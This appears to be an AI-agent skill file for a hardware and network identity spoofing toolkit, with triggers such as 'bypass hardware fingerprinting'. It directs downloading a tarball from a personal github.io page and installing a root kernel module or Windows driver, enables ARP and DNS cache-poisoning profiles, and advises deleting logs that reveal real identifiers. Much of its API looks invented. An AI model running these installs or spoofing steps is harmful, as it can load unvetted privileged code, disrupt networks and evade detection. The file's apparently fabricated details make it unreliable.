---
name: hardware-hardspoof-spoofing-toolkit
description: Hardware-level identity spoofing toolkit for network interfaces, browser fingerprints, and system identifiers
triggers:
  - spoof my hardware identity
  - randomize MAC address and device fingerprint
  - configure hardware spoofing profile
  - bypass hardware fingerprinting
  - mask system identifiers
  - setup network interface spoofing
  - create spoofing session profile
  - obfuscate device fingerprint
---

# Hardware-HardSpoof Spoofing Toolkit

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

Hardware-HardSpoof is a comprehensive spoofing toolkit that operates at multiple layers to mask hardware identities, network fingerprints, and browser characteristics. It provides kernel-level spoofing for MAC addresses, SMBIOS data, DNS/SNI, ARP, and browser fingerprints.

**Warning**: This tool is for authorized security testing only. Unauthorized spoofing may violate laws. Always obtain explicit permission before testing on any system.

## Installation

### Download

The project distributes via GitHub Pages:

```bash
# Download from the official release page
wget https://shantanu-u69.github.io/Spoof-Suite-Security/hardsp00f-latest.tar.gz

# Extract
tar -xzf hardsp00f-latest.tar.gz
cd hardsp00f
```

### Linux Installation

```bash
# Install dependencies
sudo apt-get update
sudo apt-get install -y build-essential linux-headers-$(uname -r) libyaml-dev

# Compile kernel module
make kernel-module

# Install
sudo make install

# Load kernel module
sudo modprobe hardsp00f
```

### Windows Installation

```powershell
# Run installer as Administrator
.\HardSpoof-Installer.exe

# Or manual driver installation
pnputil /add-driver .\drivers\hardsp00f.inf /install
sc create hardsp00f binPath= "C:\Program Files\HardSpoof\hardsp00fd.exe"
sc start hardsp00f
```

## CLI Commands

### Start Daemon

```bash
# Basic daemon start
sudo hardsp00fd --daemonize

# With specific profile
sudo hardsp00fd --profile /etc/hardsp00f/profiles/stealth.yaml --daemonize

# Verbose logging
sudo hardsp00fd --profile stealth_session --verbose 3 --log /var/log/hardsp00f.log
```

### Profile Management

```bash
# List available profiles
hardsp00f-cli list-profiles

# Create new profile
hardsp00f-cli create-profile --name custom_stealth --template default

# Apply profile
hardsp00f-cli apply --profile custom_stealth

# Stop spoofing
hardsp00f-cli stop
```

### Network Interface Spoofing

```bash
# Spoof specific interface
hardsp00f-cli spoof-interface eth0 --randomize-mac

# Spoof all interfaces
hardsp00f-cli spoof-interface all --mode adaptive

# Revert interface
hardsp00f-cli revert-interface eth0
```

### Status and Monitoring

```bash
# Check current status
hardsp00f-cli status

# Show active spoofs
hardsp00f-cli show-active

# Export current configuration
hardsp00f-cli export-config > current_config.yaml
```

## Configuration

### Profile Structure

Profiles are YAML files defining spoofing behavior. Default location: `/etc/hardsp00f/profiles/`

```yaml
profile:
  name: "stealth_research"
  persona:
    architecture: "random_walk_plus_mode"
    entropy_source: "hardware_thermal_noise"
  
  device_fingerprint:
    cpu:
      vendor: ["GenuineIntel", "AuthenticAMD"]
      cores: [4, 8, 16]
      hyperthreading: true
    memory:
      type: ["DDR4", "DDR5"]
      total_gb: [16, 32]
    storage:
      model: ["Samsung 980 Pro", "WD Black SN850X"]
      interface: "NVMe"
    network:
      mac_vendor: ["Intel Corporation", "Realtek Semiconductor"]
      interface_type: "Gigabit Ethernet"
  
  spoofing_strategy:
    arp:
      enabled: true
      interval_ms: 30000
      jitter_percent: 15
    dns:
      enabled: true
      cache_poison_period: 120
      resolver_rotation: true
      resolvers: ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
    sni:
      enabled: true
      tls_version_probability:
        "1.2": 0.3
        "1.3": 0.7
    browser_header:
      enabled: true
      user_agent_generator: "bayesian_decision_forest"
      canvas_noise_level: 0.02
      webgl_renderer: "ANGLE (Intel, Intel(R) UHD Graphics)"
    packet_spoofing:
      enabled: true
      ttl_variation: [64, 128]
      window_size_variation: true
```

### Minimal Profile

```yaml
profile:
  name: "basic_mac_spoof"
  persona:
    architecture: "simple_random"
  
  spoofing_strategy:
    arp:
      enabled: true
      interval_ms: 60000
    dns:
      enabled: false
    sni:
      enabled: false
    browser_header:
      enabled: false
```

### Environment Configuration

```bash
# Set config directory
export HARDSPOOF_CONFIG_DIR=/home/user/.hardspoof

# Set log level
export HARDSPOOF_LOG_LEVEL=debug

# Set default profile
export HARDSPOOF_DEFAULT_PROFILE=stealth_research

# Disable AI integration
export HARDSPOOF_DISABLE_AI=true
```

## API Usage (Python Library)

If using the Python bindings:

```python
from hardspoof import HardSpoofClient, Profile

# Initialize client
client = HardSpoofClient(config_dir="/etc/hardsp00f")

# Load profile
profile = Profile.from_file("/etc/hardsp00f/profiles/stealth.yaml")

# Apply profile
session = client.apply_profile(profile)

# Check status
status = session.get_status()
print(f"Active spoofs: {status['active_count']}")
print(f"Current MAC (eth0): {status['interfaces']['eth0']['mac']}")

# Stop session
session.stop()
```

### Custom Profile Generation

```python
from hardspoof import Profile, DeviceFingerprint, SpoofingStrategy

# Create custom profile
profile = Profile(name="custom_test")

# Configure device fingerprint
profile.device_fingerprint = DeviceFingerprint(
    cpu_vendor=["GenuineIntel"],
    cpu_cores=[8],
    memory_type=["DDR4"],
    memory_total_gb=[16]
)

# Configure spoofing strategy
profile.spoofing_strategy = SpoofingStrategy(
    arp_enabled=True,
    arp_interval_ms=45000,
    dns_enabled=True,
    dns_resolvers=["1.1.1.1", "8.8.8.8"]
)

# Save profile
profile.save("/etc/hardsp00f/profiles/custom_test.yaml")

# Apply
client.apply_profile(profile)
```

### Interface-Specific Spoofing

```python
from hardspoof import NetworkInterface

# Get interface
iface = NetworkInterface("eth0")

# Randomize MAC
original_mac = iface.get_mac()
iface.randomize_mac(vendor_prefix="Intel Corporation")
print(f"MAC changed from {original_mac} to {iface.get_mac()}")

# Set specific MAC
iface.set_mac("00:1A:2B:3C:4D:5E")

# Revert to original
iface.revert_mac()
```

## Common Patterns

### Network Research Session

```bash
#!/bin/bash
# research_session.sh

# Load stealth profile
sudo hardsp00fd --profile research_stealth --daemonize

# Wait for initialization
sleep 2

# Verify spoofing is active
hardsp00f-cli status

# Run your research tools
# tcpdump, nmap, etc.

# Cleanup on exit
trap "hardsp00f-cli stop && sudo killall hardsp00fd" EXIT

# Keep session alive
while true; do
    sleep 60
    hardsp00f-cli status | grep -q "active: true" || {
        echo "Spoofing session died, restarting..."
        sudo hardsp00fd --profile research_stealth --daemonize
    }
done
```

### Browser Fingerprint Testing

```python
from hardspoof import BrowserFingerprint
import requests

# Initialize browser fingerprint spoofing
bf = BrowserFingerprint()
bf.enable(
    canvas_noise=0.02,
    webgl_variation=True,
    user_agent_rotation=True
)

# Get spoofed headers
headers = bf.get_headers()

# Make request with spoofed fingerprint
response = requests.get(
    "https://example.com",
    headers=headers
)

# Check fingerprint detection
fingerprint_test = requests.get(
    "https://browserleaks.com/json",
    headers=headers
).json()

print(f"Detected UA: {fingerprint_test.get('user_agent')}")
print(f"Canvas hash: {fingerprint_test.get('canvas')}")
```

### Rotating MAC Addresses

```python
from hardspoof import NetworkInterface
import time
import random

iface = NetworkInterface("wlan0")

vendors = [
    "Intel Corporation",
    "Realtek Semiconductor",
    "Qualcomm Atheros"
]

# Rotate MAC every 5 minutes
while True:
    vendor = random.choice(vendors)
    iface.randomize_mac(vendor_prefix=vendor)
    print(f"Rotated to: {iface.get_mac()} ({vendor})")
    time.sleep(300)  # 5 minutes
```

### Adaptive DNS Spoofing

```yaml
# adaptive_dns.yaml
profile:
  name: "adaptive_dns"
  spoofing_strategy:
    dns:
      enabled: true
      adaptive_mode: true
      fallback_resolvers:
        - "8.8.8.8"
        - "1.1.1.1"
        - "9.9.9.9"
      poison_detection: true
      auto_rotate_on_anomaly: true
      rotation_interval: 180
```

```bash
# Apply adaptive DNS profile
sudo hardsp00fd --profile adaptive_dns --log /var/log/hardspoof_dns.log --verbose 2 &

# Monitor DNS queries
tail -f /var/log/hardspoof_dns.log | grep "DNS"
```

## Troubleshooting

### Kernel Module Won't Load

```bash
# Check module dependencies
modinfo hardsp00f

# Check kernel logs
dmesg | tail -n 50 | grep hardsp00f

# Verify kernel headers match running kernel
uname -r
dpkg -l | grep linux-headers

# Rebuild module
cd /usr/src/hardsp00f
sudo make clean
sudo make kernel-module
sudo make install
```

### Spoofing Not Persisting

```bash
# Check if daemon is running
systemctl status hardsp00f

# Enable persistence mode in profile
cat > /etc/hardsp00f/profiles/persistent.yaml <<EOF
profile:
  name: "persistent"
  persistence:
    mode: "reboot_persistent"
    restore_on_crash: true
EOF

# Apply with persistence
sudo hardsp00fd --profile persistent --persistence until_reboot
```

### MAC Address Reverts

```bash
# Disable NetworkManager interference
sudo systemctl stop NetworkManager

# Or configure NetworkManager to ignore interface
cat > /etc/NetworkManager/conf.d/hardspoof.conf <<EOF
[keyfile]
unmanaged-devices=interface-name:eth0
EOF

sudo systemctl restart NetworkManager

# Apply MAC spoof
hardsp00f-cli spoof-interface eth0 --randomize-mac --persistent
```

### Permission Denied Errors

```bash
# Ensure running as root/sudo
sudo hardsp00fd

# Check file permissions
ls -la /etc/hardsp00f/
sudo chmod 755 /etc/hardsp00f
sudo chmod 644 /etc/hardsp00f/profiles/*

# Verify user in required groups (Linux)
sudo usermod -aG hardspoof $USER
newgrp hardspoof
```

### AI Integration Not Working

```bash
# Disable AI if not needed
export HARDSPOOF_DISABLE_AI=true

# Or configure with API keys
cat > /etc/hardsp00f/ai_config.yaml <<EOF
ai_integration:
  enabled: false  # Set to true only if needed
  openai:
    api_key: ${OPENAI_API_KEY}
    model: "gpt-4-turbo-2026"
  privacy_mode: true
EOF
```

### Check Active Spoofs

```bash
# Detailed status
hardsp00f-cli status --verbose

# List all spoofed interfaces
ip link show | grep -E "link/ether"

# Check current DNS resolvers
cat /etc/resolv.conf

# Verify ARP table changes
arp -a
```

### Reset to Original State

```bash
# Stop all spoofing
hardsp00f-cli stop

# Revert all interfaces
hardsp00f-cli revert-interface all

# Unload kernel module
sudo modprobe -r hardsp00f

# Restart networking
sudo systemctl restart NetworkManager
```

## Security Considerations

- **Legal Compliance**: Only use on systems you own or have explicit permission to test
- **Network Impact**: ARP/DNS spoofing can disrupt network operations
- **Detection**: Advanced systems may detect spoofing attempts
- **Logs**: Clean up logs containing real hardware identifiers: `sudo rm -f /var/log/hardsp00f/*`
- **Revert**: Always revert to original state after testing

## Advanced Usage

### Custom Entropy Source

```python
from hardspoof import EntropySource
import os

# Use custom entropy
class CustomEntropy(EntropySource):
    def generate(self, size):
        # Use /dev/urandom or hardware RNG
        return os.urandom(size)

# Configure client to use custom entropy
client = HardSpoofClient()
client.set_entropy_source(CustomEntropy())
```

### Scripted Profile Rotation

```bash
#!/bin/bash
# rotate_profiles.sh

PROFILES=("stealth_1" "stealth_2" "stealth_3")
INTERVAL=600  # 10 minutes

while true; do
    for profile in "${PROFILES[@]}"; do
        echo "Applying profile: $profile"
        hardsp00f-cli stop
        sleep 2
        sudo hardsp00fd --profile "$profile" --daemonize
        sleep "$INTERVAL"
    done
done
```
